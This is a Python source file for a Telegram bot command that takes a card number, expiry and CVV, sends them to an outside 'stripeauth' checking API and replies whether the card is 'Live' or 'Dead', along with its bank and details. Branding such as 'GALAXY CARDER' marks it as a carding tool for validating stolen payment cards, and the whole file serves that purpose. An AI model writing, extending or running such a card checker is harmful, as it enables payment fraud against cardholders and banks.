import requests
import time

# Cooldown storage
cooldowns = {}

# List of admin IDs (Replace with actual admin IDs)
ADMINS = [6847432039, 6847432039]

def handle_su_command(bot, message):
    user_id = message.from_user.id
    current_time = time.time()

    args = message.text.split(" ", 1)
    if len(args) < 2:
        bot.reply_to(message, "<b>⚠️ Usage:</b> /su CC|MM|YYYY|CVV", parse_mode="HTML")
        return

    card_details = args[1]

    # Check cooldown before proceeding (Admins bypass cooldown)
    if user_id not in ADMINS:
        last_used = cooldowns.get(user_id, 0)
        remaining_time = 25 - (current_time - last_used)

        if remaining_time > 0:
            bot.reply_to(message, f"⏳ Wait {int(remaining_time)} sec before using /su again.", parse_mode="HTML")
            return

    # Send "Processing..." message
    processing_msg = bot.reply_to(message, "<b>🔄 Processing your request...</b>", parse_mode="HTML")

    # Start time tracking
    start_time = time.time()

    # Process the card check
    try:
        api_url = f"https://darkboy-stripeauth.onrender.com/key=darkboy/cc={card_details}"
        response = requests.get(api_url)

        if response.status_code == 200:
            time_taken = time.time() - start_time  # Calculate time taken
            result = response.text
            formatted_response = format_vip_response(result, time_taken)

            # Edit "Processing..." message with final output
            bot.edit_message_text(chat_id=message.chat.id, message_id=processing_msg.message_id, text=formatted_response, parse_mode="HTML")

            # Apply cooldown only after a successful card check
            if user_id not in ADMINS:
                cooldowns[user_id] = time.time()  # Update last usage time
        else:
            bot.edit_message_text(chat_id=message.chat.id, message_id=processing_msg.message_id, text="<b>❌ Error:</b> Unable to fetch response from API.", parse_mode="HTML")

    except requests.RequestException:
        bot.edit_message_text(chat_id=message.chat.id, message_id=processing_msg.message_id, text="<b>❌ Error:</b> API request failed.", parse_mode="HTML")

def format_vip_response(api_response, time_taken):
    """Formats the API response into a premium-looking message with time taken."""
    lines = api_response.split("\n")
    data = {}

    for line in lines:
        if "𝗖𝗔𝗥𝗗 ➺" in line:
            data["card"] = line.split("➺")[-1].strip()
        elif "𝗘𝗫𝗣𝗜𝗥𝗬 ➺" in line:
            data["expiry"] = line.split("➺")[-1].strip()
        elif "𝗖𝗩𝗩 ➺" in line:
            data["cvv"] = line.split("➺")[-1].strip()
        elif "𝗕𝗔𝗡𝗞 𝗡𝗔𝗠𝗘 ➺" in line:
            data["bank"] = line.split("➺")[-1].strip()
        elif "𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➺" in line:
            data["response"] = line.split("➺")[-1].strip()
        elif "𝗦𝗧𝗔𝗧𝗨𝗦 ➺" in line:
            status_text = line.split("➺")[-1].strip()
            data["status"] = "❌️ Dead" if "Dead" in status_text else "✅ Live" if "Live" in status_text else "⚠️ Unknown"

    formatted_message = f"""
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>🔥 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐒𝐓𝐑𝐈𝐏𝐄 𝐀𝐔𝐓𝐇 🔥</b>
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>💳 𝑪𝒂𝒓𝒅:</b> <code>{data.get("card", "N/A")}</code>  
<b>📆 𝑬𝒙𝒑𝒊𝒓𝒚:</b> <code>{data.get("expiry", "N/A")}</code>  
<b>🔑 𝑪𝑽𝑽:</b> <code>{data.get("cvv", "N/A")}</code>  
<b>🏦 𝑩𝒂𝒏𝒌:</b> <b><u>{data.get("bank", "N/A")}</u></b>  
<b>📌 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆:</b> <b><i>{data.get("response", "N/A")}</i></b>  
<b>⚡ 𝑺𝒕𝒂𝒕𝒖𝒔:</b> <b><i>{data.get("status", "N/A")}</i></b>  
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>⏱ Time Taken:</b> <code>{time_taken:.2f} sec</code>  
<b>👑 𝙑𝙄𝙋 𝘽𝙊𝙏 𝘽𝙔:</b> <code>GALAXY CARDER 🥷</code>
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
"""
    return formatted_message
